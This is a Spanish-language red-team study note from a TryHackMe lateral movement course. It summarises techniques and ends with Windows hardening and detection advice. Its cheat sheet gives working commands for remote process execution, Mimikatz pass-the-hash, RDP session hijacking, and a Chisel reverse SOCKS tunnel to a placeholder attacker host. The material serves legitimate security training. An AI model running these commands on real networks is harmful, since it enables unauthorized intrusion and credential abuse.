---
tags: [red-team, lateral-movement, pivoting]
created: 2026-04-21
source: TryHackMe - Lateral Movement and Pivoting
related:
  - "[[Moving Through the Network]]"
  - "[[Spawning Processes Remotely]]"
  - "[[Moving Laterally Using WMI]]"
  - "[[Use of Alternate Authentication Material]]"
  - "[[Abusing User Behaviour]]"
  - "[[Port Forwarding]]"
---

El lateral movement es la fase en la que un compromiso puntual se transforma en un **compromiso de dominio**. El atacante encadena credenciales, tokens, sesiones y túneles hasta alcanzar los activos críticos.

---

## Resumen de técnicas

| Técnica | Herramientas clave | Requiere |
|---------|-------------------|----------|
| Spawning Processes Remotely | PsExec, sc.exe, schtasks | Admin local + SMB/RPC |
| WMI / CIM | wmic, Invoke-WmiMethod, Invoke-CimMethod | Admin + DCOM/WinRM |
| Alternate Auth Material | Mimikatz (pth, ptt), Impacket | NTLM hash o ticket Kerberos |
| User Behaviour | tscon + sc.exe | SYSTEM + sesión activa/desconectada |
| Port Forwarding / Pivoting | socat, Chisel, SSH, proxychains | Host comprometido con conectividad |

---

## Cheat sheet rápido

```shell
# Ejecutar proceso remoto
PsExec64.exe -i -u DOM\usr -p pw \\HOST cmd.exe
wmic /node:HOST /user:DOM\usr /password:pw process call create "cmd /c payload"

# Pass the Hash
sekurlsa::pth /user:USR /domain:DOM /ntlm:HASH /run:powershell.exe

# RDP Hijack (como SYSTEM)
sc.exe create hj binPath= "cmd.exe /k tscon <ID> /dest:<MI_SESSION>"
sc.exe start hj

# Chisel SOCKS
./chisel server -p 8080 --reverse           # atacante
chisel.exe client ATTACKER:8080 R:socks     # pivote
proxychains <tool>                          # tunelizar
```

---

## Mitigaciones generales

> [!tip] Defensa en profundidad contra lateral movement:
> - **Tiered administration**: Domain Admins solo loguean en Tier-0.
> - **LAPS**: contraseña local única y rotativa por máquina.
> - **Credential Guard + Protected Users** para impedir PtH/PtT.
> - **SMB signing**, **NLA** y **WinRM HTTPS**.
> - **Microsegmentación**: bloquear 445/135/5985 entre workstations.
> - Monitoreo de **Event IDs** 4624 (logon types 3/9/10), 4648, 4672, 7045, 4698, 4778/4779.

---

## Recursos adicionales

- [MITRE ATT&CK - Lateral Movement](https://attack.mitre.org/tactics/TA0008/)
- [SANS - Lateral Movement Cheat Sheet](https://www.sans.org/posters/hunt-evil/)
- [Impacket](https://github.com/fortra/impacket)
- [Chisel](https://github.com/jpillora/chisel)
- [Mimikatz Wiki](https://github.com/gentilkiwi/mimikatz/wiki)
- [Harmj0y - Kerberos Party Tricks](https://blog.harmj0y.net/)
- [PayloadsAllTheThings - Network Pivoting](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Network%20Pivoting%20Techniques.md)
